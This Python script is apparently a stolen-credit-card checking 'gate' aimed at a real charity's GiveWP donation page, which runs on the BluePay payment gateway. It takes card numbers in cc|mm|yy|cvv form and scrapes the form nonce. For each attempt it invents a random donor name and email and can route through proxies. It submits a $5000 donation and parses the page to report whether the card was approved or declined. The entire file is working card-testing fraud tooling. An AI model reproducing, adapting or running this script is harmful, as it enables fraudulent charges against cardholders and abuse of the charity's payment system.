import aiohttp
import asyncio
import re
import random
import string

# ─── Site: remnanthouse.org (GiveWP + BluePay gateway) ─────────────────────
BASE_URL = 'https://remnanthouse.org'
DONATE_PAGE = f'{BASE_URL}/give/cheerful-giving-to-yahuah'
DONATE_IFRAME = f'{DONATE_PAGE}?giveDonationFormInIframe=1'
AJAX_URL = f'{BASE_URL}/disciples/wp-admin/admin-ajax.php'
FORM_ID = '15659'
FORM_TITLE = 'Cheerful Giving To Yahuah!'
GIVE_AMOUNT = '5000.00'  # high custom donation amount for max charge testing

FIRST_NAMES = [
    'James', 'Michael', 'Robert', 'David', 'William', 'Richard', 'Joseph',
    'Thomas', 'Charles', 'Christopher', 'Daniel', 'Matthew', 'Anthony',
    'Mark', 'Donald', 'Steven', 'Paul', 'Andrew', 'Joshua', 'Kenneth',
    'Kevin', 'Brian', 'George', 'Timothy', 'Ronald', 'Edward', 'Jason',
    'Jeffrey', 'Ryan', 'Jacob', 'Gary', 'Nicholas', 'Eric', 'Stephen'
]
LAST_NAMES = [
    'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller',
    'Davis', 'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Gonzalez',
    'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin',
    'Lee', 'Perez', 'Thompson', 'White', 'Harris', 'Sanchez', 'Clark',
    'Ramirez', 'Lewis', 'Robinson', 'Walker', 'Young', 'Allen', 'King'
]
DOMAINS = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']

UA = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
      '(KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36')


def random_email(first, last):
    user = f'{first.lower()}{last.lower()}{random.randint(10, 999)}'
    return f'{user}@{random.choice(DOMAINS)}'


def parse_result_page(html):
    """Parse BluePay payment result from the GiveWP result page.
    Returns the RAW response message exactly as the site shows it."""
    error_patterns = [
        r'<strong>Error</strong>\s*:\s*(.*?)(?:</p>|</div>|$)',
        r'give_error[^>]*>\s*(?:<p>)?\s*(?:<strong>Error</strong>\s*:?)?\s*(.*?)\s*(?:</p>|</div>)',
        r'class="give_notices give_errors"[^>]*>(.*?)</div>\s*</div>',
        r'class="[^"]*give_notice[^"]*"[^>]*>(.*?)</div>',
        r'class="[^"]*give_error[^"]*"[^>]*>(.*?)</div>',
    ]

    for pattern in error_patterns:
        error_match = re.search(pattern, html, re.DOTALL | re.IGNORECASE)
        if error_match:
            msg = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
            msg = re.sub(r'&[#\w]+;', '', msg).strip()
            msg = re.sub(r'\s+', ' ', msg).strip()
            if msg:
                return msg

    # BluePay specific: extract message from JS-rendered error data
    js_error = re.search(r'data-error[^"]*="([^"]+)"', html, re.IGNORECASE)
    if js_error:
        return js_error.group(1).strip()

    # BluePay specific: gateway response message in HTML
    bp_msg = re.search(r'(?:MESSAGE|message|status_msg)\s*[:=]\s*["\']([^"\']+)["\']', html)
    if bp_msg:
        msg = bp_msg.group(1).strip()
        if msg and len(msg) > 3:
            return msg

    # Check for success — multiple patterns
    html_lower = html.lower()
    if 'donation-confirmation' in html_lower:
        conf_match = re.search(r'confirmation.*?receipt', html, re.I | re.DOTALL)
        if conf_match:
            return "Payment Successful"
        return "Payment Successful"
    if 'give-receipt' in html_lower:
        return "Payment Successful"
    if re.search(r'thank\s+you\s+for\s+(your\s+)?donation', html, re.I):
        return "Payment Successful"

    # Check for redirect-based decline signal in page URL patterns
    if 'showdonationprocessingerror' in html_lower:
        return "Transaction declined by BluePay gateway"

    return "Unknown response"


async def check_bluepay_charge(card_info, proxy=None, max_retries=2):
    """
    BluePay Charge gate via remnanthouse.org (GiveWP donation page).
    card_info format: cc|mm|yy|cvv
    Returns dict with Response, Gateway, Price keys.
    """
    try:
        parts = card_info.strip().split('|')
        if len(parts) != 4:
            return {"Response": "Invalid card format", "Gateway": "BluePay"}

        cc = parts[0].strip()
        mm = parts[1].strip().zfill(2)
        yy = parts[2].strip()
        if len(yy) == 2:
            yy = '20' + yy
        cvv = parts[3].strip()

        proxy_url = proxy if proxy else None
        last_error = "No response"

        for attempt in range(max_retries):
            try:
                # Fresh identity for each attempt
                first = random.choice(FIRST_NAMES)
                last = random.choice(LAST_NAMES)
                email = random_email(first, last)

                timeout = aiohttp.ClientTimeout(total=30)
                # Fresh session + cookie jar per attempt to avoid stale nonces
                jar = aiohttp.CookieJar(unsafe=True)
                async with aiohttp.ClientSession(timeout=timeout, cookie_jar=jar) as session:

                    # ═══ Step 1: GET donation page → extract give-form-hash ═══════════
                    page_headers = {
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'accept-language': 'en-US,en;q=0.9',
                        'user-agent': UA,
                        'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'none',
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                    }

                    async with session.get(DONATE_IFRAME, headers=page_headers, proxy=proxy_url) as resp:
                        page_text = await resp.text()

                    hash_match = re.search(r'name="give-form-hash"\s+value="([^"]+)"', page_text)
                    prefix_match = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', page_text)
                    formid_match = re.search(r'name="give-form-id"\s+value="([^"]+)"', page_text)

                    if not hash_match:
                        last_error = "Failed to extract form hash"
                        if attempt < max_retries - 1:
                            await asyncio.sleep(1)
                            continue
                        return {"Response": last_error, "Gateway": "BluePay"}

                    form_hash = hash_match.group(1)
                    form_prefix = prefix_match.group(1) if prefix_match else f'{FORM_ID}-1'
                    form_id = formid_match.group(1) if formid_match else FORM_ID

                    amount = GIVE_AMOUNT

                    # ═══ Step 2: POST donation immediately (minimize nonce age) ══════════
                    form_data = {
                        'give-honeypot': '',
                        'give-form-id-prefix': form_prefix,
                        'give-form-id': form_id,
                        'give-form-title': FORM_TITLE,
                        'give-current-url': f'{BASE_URL}/support/',
                        'give-form-url': f'{DONATE_PAGE}/',
                        'give-form-minimum': '20.00',
                        'give-form-maximum': '999999.99',
                        'give-form-hash': form_hash,
                        'give-price-id': 'custom',
                        'give-amount': amount,
                        'give_first': first,
                        'give_last': last,
                        'give_email': email,
                        'give_comment': '',
                        'payment-mode': 'bluepay',
                        'card_number': cc,
                        'card_cvc': cvv,
                        'card_name': f'{first} {last}',
                        'card_exp_month': mm,
                        'card_exp_year': yy,
                        'card_expiry': f'{mm} / {yy[2:]}',
                        'give_action': 'purchase',
                        'give-gateway': 'bluepay',
                        'give_embed_form': '1',
                        'action': 'give_process_donation',
                    }

                    post_headers = {
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'accept-language': 'en-US,en;q=0.9',
                        'content-type': 'application/x-www-form-urlencoded',
                        'origin': BASE_URL,
                        'referer': DONATE_IFRAME,
                        'user-agent': UA,
                        'upgrade-insecure-requests': '1',
                        'sec-fetch-dest': 'iframe',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'same-origin',
                    }

                    async with session.post(
                        f'{DONATE_PAGE}/',
                        headers=post_headers,
                        data=form_data,
                        proxy=proxy_url,
                        allow_redirects=True
                    ) as resp:
                        result_text = await resp.text()

                    # ═══ Step 3: Parse the result page ═══════════════════════════
                    response_msg = parse_result_page(result_text)

                    # If nonce expired, retry with fresh session
                    if 'nonce' in response_msg.lower() or 'session expired' in response_msg.lower():
                        last_error = response_msg
                        if attempt < max_retries - 1:
                            await asyncio.sleep(2)
                            continue

                    return {
                        "Response": response_msg,
                        "Gateway": "BluePay",
                        "Price": f"${amount}"
                    }

            except asyncio.TimeoutError:
                last_error = "Timeout"
                if attempt < max_retries - 1:
                    await asyncio.sleep(1)
                    continue
            except Exception as e:
                last_error = str(e)[:100]
                if attempt < max_retries - 1:
                    await asyncio.sleep(1)
                    continue

        return {"Response": last_error, "Gateway": "BluePay", "Price": f"${GIVE_AMOUNT}"}

    except Exception as e:
        return {"Response": f"Exception: {str(e)[:100]}", "Gateway": "BluePay"}
